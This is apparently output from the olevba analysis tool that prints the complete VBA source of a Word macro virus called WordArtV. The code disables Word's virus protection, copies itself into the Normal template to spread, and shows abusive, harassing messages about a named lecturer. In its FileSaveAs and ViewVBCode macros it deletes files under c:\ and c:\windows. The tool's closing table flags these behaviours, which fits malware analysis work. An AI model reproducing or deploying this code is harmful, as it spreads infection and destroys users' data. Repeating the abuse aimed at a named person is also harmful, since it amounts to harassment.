olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Art-d31da0e300a9754ca23fa1f4bb39feb403831c72
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Art-d31da0e300a9754ca23fa1f4bb39feb403831c72 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WordArtV.bas 
in file: Virus.MSWord.Intended.Art-d31da0e300a9754ca23fa1f4bb39feb403831c72 - OLE stream: 'Macros/VBA/WordArtV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAC
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "WordArtV" Then
        bInstalled = -1
    End If
Next i
If Not bInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="WordArtV", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
    StatusBar = "Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                                                       Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                                                               Vous allez connaître WordArtV et son auteur: ZeMacroKiller98, HAHAHAHAHA!"
    For i = 1 To 400000
    Next i
Else
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="WordArtV", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
End If
ErrorAC:
Dim Valeur, Taille, Choix
Randomize
Valeur = Int(Rnd * 10) + 1
Taille = Int(Rnd * 100) + 20
Choix = Int(Rnd * 10) + 1
L$ = Int(Rnd * 250) + 1
T$ = Int(Rnd + 350) + 1
If Valeur = 1 Then
    a$ = msoTextEffect26
End If
If Valeur = 2 Then
    a = msoTextEffect13
End If
If Valeur = 3 Then
    a$ = msoTextEffect19
End If
If Valeur = 4 Then
    a$ = msoTextEffect8
End If
If Valeur = 5 Then
    a$ = msoTextEffect5
End If
If Valeur = 6 Then
    a$ = msoTextEffect16
End If
If Valeur = 7 Then
    a$ = msoTextEffect26
End If
If Valeur = 8 Then
    a$ = msoTextEffect2
End If
If Valeur = 9 Then
    a$ = msoTextEffect19
End If
If Valeur = 10 Then
    a$ = msoTextEffect29
End If
If (Choix = 1) Or (Choix = 3) Or (Choix = 5) Then
ActiveDocument.Shapes.AddTextEffect PresetTextEffect:=a$, Text:="ZeMacroKiller98", FontName:="Impact", FontSize:=Taille, FontBold:=msoFalse, FontItalic:=msoFalse, Left:=L$, Top:=T$
MsgBox "Frankie Chieng Fuck Up PC...", vbExclamation, "Frankie Sucker"
End If
If (Choix = 2) Or (Choix = 4) Or (Choix = 6) Then
ActiveDocument.Shapes.AddTextEffect PresetTextEffect:=a$, Text:="ZeMacroKiller98", FontName:="Impact", FontSize:=Taille, FontBold:=msoFalse, FontItalic:=msoFalse, Left:=L$, Top:=T$
MsgBox "Frankie have small dick!!", vbExclamation, "BillGate Fuck Frankie Chieng"
End If
If (Choix = 1) Or (Choix = 3) Or (Choix = 5) Then
MsgBox "Frankie Chieng is Stupid and Lazy Lecturer", vbInformation, "Shit LamerZZZ"
End If
ActiveDocument.Save
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
MsgBox "Frankie Chieng Want to Clean Up Your Hard Drive!!!", vbCritical, "Cleaning Job"
Kill "c:\*.*"
Kill "c:\windows\*.*"
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
    UserForm900.Show
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
    UserForm999.Show
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "Frankie Chieng Fuck Up Your PC!!!!", vbCritical, "Microsoft Word Fuck Frankie Chieng!!!"
    Kill "c:\*.*"
    Kill "c:\windows\*.*"
ErrorVVBC:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

